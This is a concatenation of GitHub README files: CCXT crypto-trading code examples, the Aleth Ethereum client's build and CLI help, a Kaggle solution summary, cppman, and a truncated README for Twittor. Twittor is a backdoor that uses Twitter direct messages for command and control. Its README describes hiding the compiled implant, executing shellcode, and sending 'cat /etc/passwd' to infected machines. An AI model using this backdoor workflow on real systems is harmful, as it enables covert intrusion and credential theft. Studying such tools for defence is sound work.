ccxt.okcoinusd ({\n        apiKey: 'YOUR_PUBLIC_API_KEY',\n        secret: 'YOUR_SECRET_PRIVATE_KEY',\n    })\n\n    const exchangeId = 'binance'\n        , exchangeClass = ccxt[exchangeId]\n        , exchange = new exchangeClass ({\n            'apiKey': 'YOUR_API_KEY',\n            'secret': 'YOUR_SECRET',\n            'timeout': 30000,\n            'enableRateLimit': true,\n        })\n\n    console.log (kraken.id,    await kraken.loadMarkets ())\n    console.log (bitfinex.id,  await bitfinex.loadMarkets  ())\n    console.log (huobipro.id,  await huobipro.loadMarkets ())\n\n    console.log (kraken.id,    await kraken.fetchOrderBook (kraken.symbols[0]))\n    console.log (bitfinex.id,  await bitfinex.fetchTicker ('BTC\/USD'))\n    console.log (huobipro.id,  await huobipro.fetchTrades ('ETH\/CNY'))\n\n    console.log (okcoinusd.id, await okcoinusd.fetchBalance ())\n\n    \/\/ sell 1 BTC\/USD for market price, sell a bitcoin for dollars immediately\n    console.log (okcoinusd.id, await okcoinusd.createMarketSellOrder ('BTC\/USD', 1))\n\n    \/\/ buy 1 BTC\/USD for $2500, you pay $2500 and receive \u0e3f1 when the order is closed\n    console.log (okcoinusd.id, await okcoinusd.createLimitBuyOrder ('BTC\/USD', 1, 2500.00))\n\n    \/\/ pass\/redefine custom exchange-specific order params: type, amount, price or whatever\n    \/\/ use a custom order type\n    bitfinex.createLimitSellOrder ('BTC\/USD', 1, 10, { 'type': 'trailing-stop' })\n\n}) ();\n```\n\n### Python\n\n```Python\n# coding=utf-8\n\nimport ccxt\n\nhitbtc   = ccxt.hitbtc({'verbose': True})\nbitmex   = ccxt.bitmex()\nhuobipro = ccxt.huobipro()\nexmo     = ccxt.exmo({\n    'apiKey': 'YOUR_PUBLIC_API_KEY',\n    'secret': 'YOUR_SECRET_PRIVATE_KEY',\n})\nkraken = ccxt.kraken({\n    'apiKey': 'YOUR_PUBLIC_API_KEY',\n    'secret': 'YOUR_SECRET_PRIVATE_KEY',\n})\n\nexchange_id = 'binance'\nexchange_class = getattr(ccxt, exchange_id)\nexchange = exchange_class({\n    'apiKey': 'YOUR_API_KEY',\n    'secret': 'YOUR_SECRET',\n    'timeout': 30000,\n    'enableRateLimit': True,\n})\n\nhitbtc_markets = hitbtc.load_markets()\n\nprint(hitbtc.id, hitbtc_markets)\nprint(bitmex.id, bitmex.load_markets())\nprint(huobipro.id, huobipro.load_markets())\n\nprint(hitbtc.fetch_order_book(hitbtc.symbols[0]))\nprint(bitmex.fetch_ticker('BTC\/USD'))\nprint(huobipro.fetch_trades('LTC\/CNY'))\n\nprint(exmo.fetch_balance())\n\n# sell one \u0e3f for market price and receive $ right now\nprint(exmo.id, exmo.create_market_sell_order('BTC\/USD', 1))\n\n# limit buy BTC\/EUR, you pay \u20ac2500 and receive \u0e3f1  when the order is closed\nprint(exmo.id, exmo.create_limit_buy_order('BTC\/EUR', 1, 2500.00))\n\n# pass\/redefine custom exchange-specific order params: type, amount, price, flags, etc...\nkraken.create_market_buy_order('BTC\/USD', 1, {'trading_agreement': 'agree'})\n```\n\n### PHP\n\n```PHP\ninclude 'ccxt.php';\n\n$poloniex = new \\ccxt\\poloniex ();\n$bittrex  = new \\ccxt\\bittrex  (array ('verbose' => true));\n$quoinex  = new \\ccxt\\quoinex   ();\n$zaif     = new \\ccxt\\zaif     (array (\n    'apiKey' => 'YOUR_PUBLIC_API_KEY',\n    'secret' => 'YOUR_SECRET_PRIVATE_KEY',\n));\n$hitbtc   = new \\ccxt\\hitbtc   (array (\n    'apiKey' => 'YOUR_PUBLIC_API_KEY',\n    'secret' => 'YOUR_SECRET_PRIVATE_KEY',\n));\n\n$exchange_id = 'binance';\n$exchange_class = \"\\\\ccxt\\\\$exchange_id\";\n$exchange = new $exchange_class (array (\n    'apiKey' => 'YOUR_API_KEY',\n    'secret' => 'YOUR_SECRET',\n    'timeout' => 30000,\n    'enableRateLimit' => true,\n));\n\n$poloniex_markets = $poloniex->load_markets ();\n\nvar_dump ($poloniex_markets);\nvar_dump ($bittrex->load_markets ());\nvar_dump ($quoinex->load_markets ());\n\nvar_dump ($poloniex->fetch_order_book ($poloniex->symbols[0]));\nvar_dump ($bittrex->fetch_trades ('BTC\/USD'));\nvar_dump ($quoinex->fetch_ticker ('ETH\/EUR'));\nvar_dump ($zaif->fetch_ticker ('BTC\/JPY'));\n\nvar_dump ($zaif->fetch_balance ());\n\n\/\/ sell 1 BTC\/JPY for market price, you pay \u00a5 and receive \u0e3f immediately\nvar_dump ($zaif->id, $zaif->create_market_sell_order ('BTC\/JPY', 1));\n\n\/\/ buy BTC\/JPY, you receive \u0e3f1 for \u00a5285000 when the order closes\nvar_dump ($zaif->id, $zaif->create_limit_buy_order ('BTC\/JPY', 1, 285000));\n\n\/\/ set a custom user-defined id to your order\n$hitbtc->create_order ('BTC\/USD', 'limit', 'buy', 1, 3000, array ('clientOrderId' => '123'));\n```\n\n## Contributing\n\nPlease read the [CONTRIBUTING](https:\/\/github.com\/ccxt\/ccxt\/blob\/master\/CONTRIBUTING.md) document before making changes that you would like adopted in the code. Also, read the [Manual](https:\/\/github.com\/ccxt\/ccxt\/wiki) for more details.\n\n## Support Developer Team\n\nWe are investing a significant amount of time into the development of this library. If CCXT made your life easier and you want to help us improve it further, or if you want to speed up development of new features and exchanges, please support us with a tip. We appreciate all contributions!\n\n### Sponsors\n\nSupport this project by becoming a sponsor. Your logo will show up here with a link to your website.\n\n[[Become a sponsor](https:\/\/opencollective.com\/ccxt#sponsor)]\n\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/0\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/0\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/1\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/1\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/2\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/2\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/3\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/3\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/4\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/4\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/5\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/5\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/6\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/6\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/7\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/7\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/8\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/8\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/9\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/sponsor\/9\/avatar.svg\"><\/a>\n\n### Supporters\n\nSupport this project by becoming a supporter. Your avatar will show up here with a link to your website.\n\n[[Become a supporter](https:\/\/opencollective.com\/ccxt#supporter)]\n\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/0\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/0\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/1\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/1\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/2\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/2\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/3\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/3\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/4\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/4\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/5\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/5\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/6\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/6\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/7\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/7\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/8\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/8\/avatar.svg\"><\/a>\n<a href=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/9\/website\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/supporter\/9\/avatar.svg\"><\/a>\n\n### Backers\n\nThank you to all our backers! [[Become a backer](https:\/\/opencollective.com\/ccxt#backer)]\n\n<a href=\"https:\/\/opencollective.com\/ccxt#backers\" target=\"_blank\"><img src=\"https:\/\/opencollective.com\/ccxt\/tiers\/backer.svg?width=890\"><\/a>\n\n### Crypto\n\n```\nETH 0x26a3CB49578F07000575405a57888681249c35Fd (ETH only)\nBTC 33RmVRfhK2WZVQR1R83h2e9yXoqRNDvJva\nBCH 1GN9p233TvNcNQFthCgfiHUnj5JRKEc2Ze\nLTC LbT8mkAqQBphc4yxLXEDgYDfEax74et3bP\n```\n\nThank you!\n\n## Social\n\n- [Follow us on Twitter](https:\/\/twitter.com\/ccxt_official)\n- [Read our blog on Medium](https:\/\/medium.com\/@ccxt)\n\n## Team\n\n- [Igor Kroitor](https:\/\/github.com\/kroitor)\n- [Vitaly Gordon](https:\/\/github.com\/xpl)\n- [Denis Voropaev](https:\/\/github.com\/tankakatan)\n- [Carlo Revelli](https:\/\/github.com\/frosty00)\n\n## Contact Us\n\nFor business inquiries: info@ccxt.trade\n"},{"repo":"\/ethereum\/aleth","language":"C++","readme_contents":"# Aleth \u2013 Ethereum C++ client, tools and libraries\n\n> The collection of C++ libraries and tools for Ethereum,\n> formerly known as _cpp-ethereum_ project.\n> This includes the full Ethereum client **aleth**.\n\n\n## Contact\n\n[![Gitter](https:\/\/img.shields.io\/gitter\/room\/ethereum\/aleth.svg)](https:\/\/gitter.im\/ethereum\/aleth)\n[![GitHub Issues](https:\/\/img.shields.io\/github\/issues-raw\/ethereum\/aleth.svg)](https:\/\/github.com\/ethereum\/aleth\/issues)\n\n- Chat in [aleth channel on Gitter](https:\/\/gitter.im\/ethereum\/aleth).\n- Report bugs, issues or feature requests using [GitHub issues](https:\/\/github.com\/ethereum\/aleth\/issues\/new).\n\n\n## Usage\n\nThe Ethereum Documentation site hosts the **[aleth homepage](http:\/\/cpp-ethereum.org)**, which\nhas a Quick Start section.\n\n\nOperating system | Status\n---------------- | ----------\nUbuntu and macOS | [![TravisCI](https:\/\/img.shields.io\/travis\/ethereum\/aleth\/develop.svg)](https:\/\/travis-ci.org\/ethereum\/aleth)\nWindows          | [![AppVeyor](https:\/\/img.shields.io\/appveyor\/ci\/ethereum\/cpp-ethereum\/develop.svg)](https:\/\/ci.appveyor.com\/project\/ethereum\/cpp-ethereum)\n\n\n## Install\n\n### Download release binaries\n\nhttps:\/\/github.com\/ethereum\/aleth\/releases\n\n### Using docker images\n\nAleth:\n```bash\ndocker run ethereum\/aleth --help\n```\n\nTesteth:\n```bash\ndocker run ethereum\/testeth --help\n```\n\n### Building from source\n\n#### Get the source code\n\nGit and GitHub are used to maintain the source code. Clone the repository by:\n\n```shell\ngit clone --recursive https:\/\/github.com\/ethereum\/aleth.git\ncd aleth\n```\n\nThe `--recursive` option is important. It orders git to clone additional\nsubmodules to build the project.\nIf you missed `--recursive` option, you are able to correct your mistake with command\n`git submodule update --init`.\n\n#### Install CMake\n\nCMake is used to control the build configuration of the project. Latest version of CMake is required\n(at the time of writing [3.9.3 is the minimum](CMakeLists.txt#L5)).\nWe strongly recommend you to install CMake by downloading and unpacking the binary\ndistribution  of the latest version available on the\n[**CMake download page**](https:\/\/cmake.org\/download\/).\n\nThe CMake package available in your operating system can also be installed\nand used if it meets the minimum version requirement.\n\n> **Alternative method**\n>\n> The repository contains the\n[scripts\/install_cmake.sh](scripts\/install_cmake.sh) script that downloads\n> a fixed version of CMake and unpacks it to the given directory prefix.\n> Example usage: `scripts\/install_cmake.sh --prefix \/usr\/local`.\n\n#### Build\n\nConfigure the project build with the following command to create the\n`build` directory with the configuration.\n\n```shell\nmkdir build; cd build  # Create a build directory.\ncmake ..               # Configure the project.\ncmake --build .        # Build all default targets.\n```\n\nOn **Windows** we support Visual Studio 2017, and 2019. You should generate a Visual Studio solution file (`.sln`) for the 64-bit architecture via the following command:\n\n* **Visual Studio 2017**: `cmake .. -G \"Visual Studio 15 2017 Win64\"`\n* **Visual Studio 2019**: `cmake .. -G \"Visual Studio 16 2019\" -A x64`\n\nAfter the necessary dependencies have been downloaded and built and the solution has been generated, `aleth.sln` can be found in the\n`build` directory.\n\n#### Common Issues Building on Windows\n##### LINK : fatal error LNK1158: cannot run 'rc.exe'\nRc.exe is the [Microsoft Resource Compiler](https:\/\/docs.microsoft.com\/en-us\/windows\/desktop\/menurc\/resource-compiler). It's distributed with the [Windows SDK](https:\/\/developer.microsoft.com\/en-US\/windows\/downloads\/windows-10-sdk) and is required for generating the Visual Studio solution file. It can be found in the following directory: ```%ProgramFiles(x86)%\\Windows Kits\\<OS major version>\\bin\\<OS full version>\\<arch>\\```\n\nIf you hit this error, adding the directory to your path (and launching a new command prompt) should fix the issue.\n\n## Contribute\n\n[![Contributors](https:\/\/img.shields.io\/github\/contributors\/ethereum\/aleth.svg)](https:\/\/github.com\/ethereum\/aleth\/graphs\/contributors)\n[![Gitter](https:\/\/img.shields.io\/gitter\/room\/ethereum\/aleth.svg)](https:\/\/gitter.im\/ethereum\/aleth)\n[![up-for-grabs](https:\/\/img.shields.io\/github\/issues-raw\/ethereum\/aleth\/help%20wanted.svg)](https:\/\/github.com\/ethereum\/aleth\/labels\/help%20wanted)\n\nThe current codebase is the work of many, many hands, with over 100\n[individual contributors](https:\/\/github.com\/ethereum\/aleth\/graphs\/contributors) over the course of its development.\n\nOur day-to-day development chat happens on the\n[aleth](https:\/\/gitter.im\/ethereum\/aleth) Gitter channel.\n\nAll contributions are welcome! We try to keep a list of tasks that are suitable\nfor newcomers under the tag\n[help wanted](https:\/\/github.com\/ethereum\/aleth\/labels\/help%20wanted).\nIf you have any questions, please do not hesitate to ask us about more information.\n\nPlease read [CONTRIBUTING](CONTRIBUTING.md) and [CODING_STYLE](CODING_STYLE.md)\nthoroughly before making alterations to the code base.\n\nAll development goes in develop branch.\n\n## Usage\n*Note: The following is the output of ```.\/aleth -h [--help]``` on Linux*\n\n```\nNAME:\n   aleth 1.7.2\nUSAGE:\n   aleth [options]\n\nWALLET USAGE:\n   account list                                List all keys available in wallet\n   account new                                 Create a new key and add it to wallet\n   account update [<uuid>|<address> , ... ]    Decrypt and re-encrypt keys\n   account import [<uuid>|<file>|<secret-hex>] Import keys from given source and place in wallet\n   wallet import <file>                        Import a presale wallet\n\nCLIENT MODE (default):\n  --mainnet                               Use the main network protocol\n  --ropsten                               Use the Ropsten testnet\n  --test                                  Testing mode; disable PoW and provide test rpc interface\n  --config <file>                         Configure specialised blockchain using given JSON information\n\n  --ipc                                   Enable IPC server (default: on)\n  --ipcpath <path>                        Set .ipc socket path (default: data directory)\n  --no-ipc                                Disable IPC server\n  --admin <password>                      Specify admin session key for JSON-RPC (default: auto-generated and printed at start-up)\n  -K [ --kill ]                           Kill the blockchain first\n  -R [ --rebuild ]                        Rebuild the blockchain from the existing database\n  --rescue                                Attempt to rescue a corrupt database\n\n  --import-presale <file>                 Import a pre-sale key; you'll need to specify the password to this key\n  -s [ --import-secret ] <secret>         Import a secret key into the key store\n  -S [ --import-session-secret ] <secret> Import a secret session into the key store\n  --master <password>                     Give the master password for the key store; use --master \"\" to show a prompt\n  --password <password>                   Give a password for a private key\n\nCLIENT TRANSACTING:\n  --ask <wei>            Set the minimum ask gas price under which no transaction will be mined (default: 20000000000)\n  --bid <wei>            Set the bid gas price to pay for transactions (default: 20000000000)\n  --unsafe-transactions  Allow all transactions to proceed without verification; EXTREMELY UNSAFE\n\nCLIENT NETWORKING:\n  -b [ --bootstrap ]              Connect to the default Ethereum peer servers (default unless --no-discovery used)\n  --no-bootstrap                  Do not connect to the default Ethereum peer servers (default only when --no-discovery is used)\n  -x [ --peers ] <number>         Attempt to connect to a given number of peers (default: 11)\n  --peer-stretch <number>         Give the accepted connection multiplier (default: 7)\n  --public-ip <ip>                Force advertised public IP to the given IP (default: auto)\n  --listen-ip <ip>(:<port>)       Listen on the given IP for incoming connections (default: 0.0.0.0)\n  --listen <port>                 Listen on the given port for incoming connections (default: 30303)\n  -r [ --remote ] <host>(:<port>) Connect to the given remote host (default: none)\n  --port <port>                   Connect to the given remote port (default: 30303)\n  --network-id <n>                Only connect to other hosts with this network id\n  --allow-local-discovery         Include local addresses in the discovery process. Used for testing purposes.\n  --peerset <list>                Comma delimited list of peers; element format: type:enode:\/\/publickey@ipAddress[:port[?discport=port]]\n                                          Types:\n                                          default     Attempt connection when no other peers are available and pinning is disabled\n                                          required    Keep connected at all times\n\n                                          Ports:\n                                          The first port argument is the tcp port used for direct communication among peers. If the second port\n                                          argument isn't supplied, the first port argument will also be the udp port used for node discovery.\n                                          If neither the first nor second port arguments are supplied, a default port of 30303 will be used for\n                                          both peer communication and node discovery.\n  --no-discovery                  Disable node discovery; implies --no-bootstrap\n  --pin                           Only accept or connect to trusted peers\n\nCLIENT MINING:\n  -a [ --address ] <addr>         Set the author (mining payout) address (default: auto)\n  -m [ --mining ] <on\/off\/number> Enable mining; optionally for a specified number of blocks (default: off)\n  --extra-data arg                Set extra data for the sealed blocks\n\nBENCHMARKING MODE:\n  -M [ --benchmark ]           Benchmark for mining and exit\n  --benchmark-warmup <seconds> Set the duration of warmup for the benchmark tests (default: 3)\n  --benchmark-trial <seconds>  Set the duration for each trial for the benchmark tests (default: 3)\n  --benchmark-trials <n>       Set the number of trials for the benchmark tests (default: 5)\n\nMINING CONFIGURATION:\n  -C [ --cpu ]                 When mining, use the CPU\n  -t [ --mining-threads ] <n>  Limit number of CPU\/GPU miners to n (default: use everything available on selected platform)\n  --current-block <n>          Let the miner know the current block number at configuration time. Will help determine DAG size and required GPU memory\n  --disable-submit-hashrate    When mining, don't submit hashrate to node\n\nIMPORT\/EXPORT MODES:\n  -I [ --import ] <file>      Import blocks from file\n  -E [ --export ] <file>      Export blocks to file\n  --from <n>                  Export only from block n; n may be a decimal, a '0x' prefixed hash, or 'latest'\n  --to <n>                    Export only to block n (inclusive); n may be a decimal, a '0x' prefixed hash, or 'latest'\n  --only <n>                  Equivalent to --export-from n --export-to n\n  --format <binary\/hex\/human> Set export format\n  --dont-check                Prevent checking some block aspects. Faster importing, but to apply only when the data is known to be valid\n  --download-snapshot <path>  Download Parity Warp Sync snapshot data to the specified path\n  --import-snapshot <path>    Import blockchain and state data from the Parity Warp Sync snapshot\n\nDATABASE OPTIONS:\n  --db <name> (=leveldb)      Select database implementation. Available options are: leveldb, memorydb.\n  --db-path <path> (=$HOME\/.ethereum) Database path (for non-memory database options)\n\nVM OPTIONS:\n  --vm <name>|<path> (=legacy) Select VM implementation. Available options are: interpreter, legacy.\n  --evmc  <option>=<value>     EVMC option\n\nLOGGING OPTIONS:\n  -v [ --log-verbosity ] <0 - 4>        Set the log verbosity from 0 to 4 (default: 2).\n  --log-channels <channel_list>         Space-separated list of the log channels to show (default: show all channels).\n                                        Channels: block blockhdr bq chain client debug discov error ethcap exec host impolite info net overlaydb p2pcap peer\n                                        rlpx rpc snap statedb sync timer tq trace vmtrace warn warpcap watch\n  --log-exclude-channels <channel_list> Space-separated list of the log channels to hide.\n\n  --log-vmtrace                         Enable VM trace log (requires log-verbosity 4).\n\nGENERAL OPTIONS:\n  -d [ --data-dir ] <path> Load configuration files and keystore from path (default: $HOME\/.ethereum)\n  -V [ --version ]         Show the version and exit\n  -h [ --help ]            Show this help message and exit\n```\n\n## Mining\n\nThis project is **not suitable for Ethereum mining** because the support for GPU mining\nhas been dropped some time ago including the ethminer tool. Use the ethminer tool from https:\/\/github.com\/ethereum-mining\/ethminer.\n\n## Testing\nDetails on how to run and debug the tests can be found [here](doc\/usingtesteth.rst)\n\n\n## Documentation\n\n- [Internal documentation for developers](doc\/index.rst).\n- [Outdated documentation for end users](http:\/\/www.ethdocs.org\/en\/latest\/ethereum-clients\/cpp-ethereum\/).\n\n\n## License\n\n[![License](https:\/\/img.shields.io\/github\/license\/ethereum\/aleth.svg)](LICENSE)\n\nAll contributions are made under the [GNU General Public License v3](https:\/\/www.gnu.org\/licenses\/gpl-3.0.en.html). See [LICENSE](LICENSE).\n"},{"repo":"\/HouJP\/kaggle-quora-question-pairs","language":"Python","readme_contents":"****\n\n#\t<center>Kaggle: Quora Question Pairs (Comming Soon)<\/center>\n##### <center>Author: Liang Pang, Yixing Fan, Jianpeng Hou, Xinyu Yue, Guocheng Niu<\/center>\n\n****\n\n##\tCategories\n*\t[Abstract](#abstract)\n* \t[Summary](#summary)\n\n****\n\n##\t<a name=\"abstract\"> Abstract <\/a>\n\nIn the Quora Question Pairs Challenge, we were asked to build a model to classify whether question pairs are duplicates or not (multiple versions of the same question). Our final submission was a stacking result of multiple models. This submission scored **0.11450** on Public LB and **0.11768** on Private LB (with post-process), ranking **4** out of **3396** teams. This documents describes our team's solution which can be divided into diffrent parts: Pre-processing, Feature Engineering, Modeling and Post-processing.\n\n****\n\n##\t<a name=\"summary\"> Summary <\/a>\n\nOur solution consisted of four main parts: Pre-processing, Feature Engineering, Modeling and Post-processing. What's more, we developed a light weight Machine Learning framework **FeatWheel** to help us to finish ML jobs, such as feature extraction, feature merging and so on.\n\nIn pre-processing, we process the text of data with text cleaning, word stemming, removing stop words and shared words and can form different versions of original data. In feature engineering, we extracted features based on various versions of data. The features can be classified in to three categories\uff1aStatistical Features, NLP Features and Graph Features. In modeling, we build deep models, boosting models (using XGBoost, LightGBM) and linear models (Linear Regression) and build a multi-layer stacking system to ensemble different models together. As we all know, the distribution of the training data and test data are quite different, so we made post-processing on the prediction results. We cut the data into different parts according to the clique size and rescale the results in different parts. \n\n###\tFlowchart\n\nThe flowchart of our method is shown as follows:\n\n![flowchart](.\/img\/flowchart.png)\n\n###\tSubmission\n\nSubmissions were evaluated on the log loss between the predicted values and the group truth. In specific, the best single model we have obtained during the competition was an XGBoost model with tree booster of Public LB score **0.12653** and Private LB score **0.13067** (without post-process). Our final submission was a stacking result of multiple models. This submission scored **0.11450** on Public LB and **0.11768** on Private LB (with post-process), ranking **4** out of **3396** teams.\n\n****\n\n### Deep Model\n\nPlease see [TextNet](https:\/\/github.com\/pl8787\/textnet-release) and [TextNet-Model](https:\/\/github.com\/pl8787\/textnet-model). For tensorflow version, please checkout [MatchZoo](https:\/\/github.com\/faneshion\/MatchZoo).\n"},{"repo":"\/aitjcize\/cppman","language":"Python","readme_contents":".. image:: http:\/\/img.shields.io\/travis\/aitjcize\/cppman.svg?style=flat\n   :target: https:\/\/travis-ci.org\/aitjcize\/cppman\n.. image:: http:\/\/img.shields.io\/pypi\/v\/cppman.svg?style=flat\n   :target: https:\/\/pypi.python.org\/pypi\/cppman\n.. image::  https:\/\/img.shields.io\/github\/downloads\/aitjcize\/cppman\/total.svg\n   :target: https:\/\/pypi.python.org\/pypi\/cppman#downloads\n\ncppman\n======\nC++ 98\/11\/14\/17\/20 manual pages for Linux, with source from `cplusplus.com <http:\/\/cplusplus.com\/>`_ and `cppreference.com <https:\/\/cppreference.com\/>`_.\n\n.. image:: https:\/\/raw.github.com\/aitjcize\/cppman\/master\/wiki\/screenshot.png\n\nFeatures\n--------\n* Supports two backends (switch it with ``cppman -s``):\n\n  + `cplusplus.com <http:\/\/cplusplus.com\/>`_\n  + `cppreference.com <http:\/\/cppreference.com\/>`_\n\n* Syntax highlighting support for sections and example source code.\n* Usage\/Interface similar to the 'man' command\n* Hyperlink between manpages (only available when pager=vim)\n\n  + Press ``Ctrl-]`` when cursor is on keyword to go forward and ``Ctrl-T`` to go backward.\n  + You can also double-click on keyword to go forward and right-click to go backward.\n\n* Frequently update to support `cplusplus.com <http:\/\/cplusplus.com\/>`_.\n\nDemo\n----\nUsing vim as pager\n\n.. image:: https:\/\/raw.github.com\/aitjcize\/cppman\/master\/wiki\/demo.gif\n\nInstallation\n------------\n1. Install from PyPI:\n\n.. code-block:: bash\n\n    $ pip install cppman\n\nNote that cppman requires Python 3. Make sure that either ``pip`` is configured for Python 3 installation, your default Python interpreter is version 3 or just use ``pip3`` instead.\n\n2. Arch Linux users can find it on AUR or using `Trizen <https:\/\/wiki.archlinux.org\/title\/Trizen>`_:\n\n.. code-block:: bash\n\n    $ trizen -S cppman\n\nor install the git version\n\n.. code-block:: bash\n\n    $ trizen -S cppman-git\n\n3. Debian \/ Ubuntu: cppman is available in Debian sid\/unstable and Ubuntu vivid.\n\n.. code-block:: bash\n\n    $ sudo apt-get install cppman\n\nPackage Maintainers\n-------------------\n* Arch Linux: myself\n* Debian: `czchen <https:\/\/github.com\/czchen>`_\n* Gentoo: `rindeal <https:\/\/github.com\/rindeal>`_\n* MacPorts: `eborisch <https:\/\/github.com\/eborisch>`_\n\nFAQ\n---\n* Q: Can I use the system ``man`` command instead of ``cppman``?\n* A: Yes, just execute ``cppman -m true`` and all cached man pages are exposed to the system ``man`` command.  Note: You may want to download all available man pages with ``cppman -c``.\n* Q: Why is bash completion is not working properly with ``::``?\n* A: It is because bash treats ``:`` like a white space. To fix this add ``export COMP_WORDBREAKS=\" \/\\\"\\'><;|&(\"`` to your ``~\/.bashrc``.\n\nBugs\n----\n* Please report bugs \/ mis-formatted pages to the github issue tracker.\n\nContributing\n------------\n1. Fork it\n2. Create your feature branch (``git checkout -b my-new-feature``)\n3. Commit your changes (``git commit -am 'Add some feature'``)\n4. Push to the branch (``git push origin my-new-feature``)\n5. Create new Pull Request\n\nNotes\n-----\n* manpages-cpp is renamed to cppman since September 19, 2012\n"},{"repo":"\/PaulSec\/twittor","language":"Python","readme_contents":"Twittor\n====\nA stealthy Python based backdoor that uses Twitter (Direct Messages) as a command and control server\nThis project has been inspired by [Gcat](https:\/\/github.com\/byt3bl33d3r\/gcat) which does the same but using a Gmail account.\n\nSetup \n=====\nFor this to work you need:\n- A Twitter account (**Use a dedicated account! Do not use your personal one!**)\n- [Register an app](https:\/\/apps.twitter.com\/app\/new) on Twitter with **Read, write, and direct messages** Access levels. \n\nInstall the dependencies:\n\n```\n$ pip install -r requirements.txt\n```\n\nThis repo contains two files:\n- ```twittor.py``` which is the client\n- ```implant.py``` the actual backdoor to deploy\n\nIn both files, edit the access token part and add the ones that you previously generated:\n\n```python\nCONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\nCONSUMER_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\n\nACCESS_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\nACCESS_TOKEN_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'\n\nUSERNAME = 'XXXXXXXXXXXXXXXXXXXXXXXX'\n```\n\nYou're probably going to want to compile ```implant.py``` into an executable using [Pyinstaller](https:\/\/github.com\/pyinstaller\/pyinstaller)\nIn order to remove the console when compiling with Pyinstaller, the flags ```--noconsole --onefile``` will help. Just saying. \n\nUsage\n=====\n\nIn order to run the client, launch the script. \n\n```\n$ python twittor.py\n```\n\nYou'll then get into an 'interactive' shell which offers few commands that are:\n\n```\n$ help\n\n    refresh - refresh C&C control\n    list_bots - list active bots\n    list_commands - list executed commands\n    !retrieve <jobid> - retrieve jobid command\n    !cmd <MAC ADDRESS> command - execute the command on the bot\n    !shellcode <MAC ADDRESS> shellcode - load and execute shellcode in memory (Windows only)\n    help - print this usage\n    exit - exit the client\n    \n$ \n```\n\n- Once you've deployed the backdoor on a couple of systems, you can check available clients using the list command:\n```\n$ list_bots\nB7:76:1F:0B:50:B7: Linux-x.x.x-generic-x86_64-with-Ubuntu-14.04-precise\n$\n```\n\nThe output is the MAC address which is used to uniquely identifies the system but also gives you OS information the implant is running on. In that case a Linux box. \n\n\n- Let's issue a command to an implant:\n```\n$ !cmd B7:76:1F:0B:50:B7 cat \/etc\/passwd\n[+] Sent command \"cat \/etc\/passwd\" with jobid: UMW07r2\n$\n```\n\nHere we are telling ```B7:76:1F:0B:50:B7``` 